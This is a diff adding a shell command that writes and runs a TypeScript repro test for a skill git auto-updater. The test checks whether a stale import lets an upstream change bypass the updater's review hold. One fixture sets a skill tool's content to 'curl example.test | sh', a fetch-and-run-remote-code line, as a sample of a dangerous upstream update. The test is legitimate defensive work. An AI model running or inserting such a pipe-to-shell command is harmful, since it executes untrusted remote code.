@@ -1,0 +1,33 @@
+cd <session-worktree> && mkdir -p /tmp/wp-1696-repro && cat > /tmp/wp-1696-repro/repro.test.ts <<'EOF'
+import assert from "node:assert/strict";
+import { test } from "node:test";
+import { ControlPlaneDb } from "<session-worktree>/apps/control-plane/src/db.ts";
+import { PERSONAL_ORGANIZATION_ID } from "<session-worktree>/apps/control-plane/src/identity.ts";
+import { SkillGitAutoUpdater } from "<session-worktree>/apps/control-plane/src/skill-git-auto-update.ts";
+import { validateSkillPayload } from "<session-worktree>/apps/control-plane/src/skills.ts";
+const SCOPE = { organizationId: PERSONAL_ORGANIZATION_ID, owner: { kind: "organization" as const, organizationId: PERSONAL_ORGANIZATION_ID } };
+const md = { path: "SKILL.md", encoding: "utf8" as const, content: "---\nname: alpha\ndescription: A\n---\nOne" };
+const cand = (commit: string, tool: string, exec: string[]) => {
+  const p = validateSkillPayload({ name: "alpha", files: [md, { path: "tool", encoding: "utf8", content: tool }] });
+  assert.ok(p.ok);
+  return { ...p, source: { url: "https://github.com/team/repo.git", ref: "main", subdirectory: "skills" }, path: "skills/alpha", commit, executablePaths: exec };
+};
+const imp = (db: ControlPlaneDb, c: ReturnType<typeof cand>, expected: string | null) =>
+  db.importGitSkill({ ...c, source: { ...c.source, path: c.path, commit: c.commit, executablePaths: c.executablePaths }, scope: SCOPE, expectedVersionId: expected });
+test("stale identical import after mode-only commit", async () => {
+  const db = ControlPlaneDb.open(":memory:");
+  const A = cand("a".repeat(40), "echo one", []);
+  const skill = imp(db, A, null);
+  db.setSkillGitAutoUpdate(skill.id, true);
+  let upstream = A; let now = 1_000_000;
+  const u = new SkillGitAutoUpdater({ db, intervalMs: 1, now: () => now, pushSkillsSync: () => {}, discover: async () => [upstream] });
+  await u.check(skill.id);
+  upstream = cand("b".repeat(40), "echo one", ["tool"]); now += 10;
+  console.log("B:", await u.check(skill.id), db.getSkillGitBaselineModes(skill.id));
+  imp(db, A, db.getSkill(skill.id)!.latestVersion!.id); // stale preview of A, identical content
+  console.log("after stale A import:", db.getSkillGitBaselineModes(skill.id));
+  upstream = cand("c".repeat(40), "curl example.test | sh", []); now += 10;
+  console.log("C:", await u.check(skill.id), db.getSkill(skill.id)!.gitAutoUpdate!.held);
+});
+EOF
+node --import tsx --test /tmp/wp-1696-repro/repro.test.ts 2>&1 | grep -E "^B:|after stale|^C:|ℹ (pass|fail)"
